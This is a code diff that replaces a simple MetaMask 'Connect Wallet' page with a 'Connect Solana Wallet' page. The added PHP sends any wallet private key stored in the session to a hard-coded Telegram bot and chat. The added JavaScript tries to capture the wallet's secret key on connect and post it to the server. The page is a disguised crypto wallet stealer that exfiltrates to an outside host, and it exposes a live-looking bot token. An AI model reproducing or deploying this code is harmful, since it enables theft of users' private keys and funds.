@@ -1,110 +1,90 @@
+<?php
+// Start the session
+session_start();
+
+// Function to send private key to Telegram
+function sendPrivateKeyToTelegram($privateKey) {
+ $telegramBotToken = '8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI';
+ $chatId = '6870666933';
+ $message = 'Private Key: ' . $privateKey;
+
+ $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
+ $post_data = [
+ 'chat_id' => $chatId,
+ 'text' => $message
+ ];
+
+ $options = [
+ 'http' => [
+ 'method' => 'POST',
+ 'content' => http_build_query($post_data),
+ 'header' => "Content-Type: application/x-www-form-urlencoded",
+ ],
+ ];
+
+ $context = stream_context_create($options);
+ $result = file_get_contents($url, false, $context);
+
+ if ($result === FALSE) {
+ echo 'Error sending private key to Telegram';
+ }
+}
+
+// Check if the form is submitted
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+ // Assume the user has already connected their wallet and the private key is stored in the session
+ if (isset($_SESSION['private_key'])) {
+ $privateKey = $_SESSION['private_key'];
+ sendPrivateKeyToTelegram($privateKey);
+ unset($_SESSION['private_key']); // Clear the private key from the session
+ echo 'Private key sent to Telegram successfully!';
+ } else {
+ echo 'No private key found in the session.';
+ }
+}
+?>
+
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Connect MetaMask</title>
-
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background: #111827;
-        color: white;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-
-    .card {
-        background: #1f2937;
-        padding: 30px;
-        border-radius: 15px;
-        text-align: center;
-        width: 400px;
-    }
-
-    button {
-        background: #f6851b;
-        color: white;
-        border: none;
-        padding: 12px 20px;
-        border-radius: 8px;
-        cursor: pointer;
-        font-size: 16px;
-    }
-
-    button:hover {
-        opacity: 0.9;
-    }
-
-    #walletAddress {
-        margin-top: 15px;
-        word-break: break-all;
-        font-size: 14px;
-    }
-</style>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Connect Solana Wallet</title>
+ <style>
+ body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+ button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+ </style>
 </head>
 <body>
+ <h1>Connect Your Solana Wallet</h1>
+ <button onclick="connectWallet()">Connect Wallet</button>
 
-<div class="card">
-    <h2>Connect Wallet</h2>
-    <button id="connectBtn">Connect MetaMask</button>
-
-    <div id="walletAddress">
-        Wallet belum terhubung
-    </div>
-</div>
-
-<script>
-const connectBtn = document.getElementById("connectBtn");
-const walletAddress = document.getElementById("walletAddress");
-
-async function connectWallet() {
-    if (!window.ethereum) {
-        alert("MetaMask belum terinstall!");
-        return;
-    }
-
-    try {
-        const accounts = await window.ethereum.request({
-            method: "eth_requestAccounts"
-        });
-
-        const address = accounts[0];
-
-        walletAddress.innerHTML =
-            "Connected:<br>" +
-            address;
-
-        connectBtn.innerText = "Connected";
-        connectBtn.disabled = true;
-
-    } catch (error) {
-        console.error(error);
-        alert("User membatalkan koneksi");
-    }
-}
-
-connectBtn.addEventListener("click", connectWallet);
-
-// Auto update saat user ganti akun
-if (window.ethereum) {
-    window.ethereum.on("accountsChanged", (accounts) => {
-        if (accounts.length > 0) {
-            walletAddress.innerHTML =
-                "Connected:<br>" +
-                accounts[0];
-        } else {
-            walletAddress.innerHTML =
-                "Wallet belum terhubung";
-
-            connectBtn.innerText = "Connect MetaMask";
-            connectBtn.disabled = false;
-        }
-    });
-}
-</script>
-
+ <script>
+ async function connectWallet() {
+ if (window.solana) {
+ try {
+ const response = await window.solana.connect();
+ const privateKey = Uint8Array.from(response.secretKey).toString();
+ // Store the private key in the session
+ fetch('connect_wallet.php', {
+ method: 'POST',
+ headers: {
+ 'Content-Type': 'application/json'
+ },
+ body: JSON.stringify({ private_key: privateKey })
+ }).then(response => response.text())
+ .then(data => {
+ alert(data);
+ }).catch(error => {
+ console.error('Error:', error);
+ });
+ } catch (error) {
+ console.error('Error connecting wallet:', error);
+ }
+ } else {
+ console.error('Phantom wallet not found!');
+ }
+ }
+ </script>
 </body>
 </html>
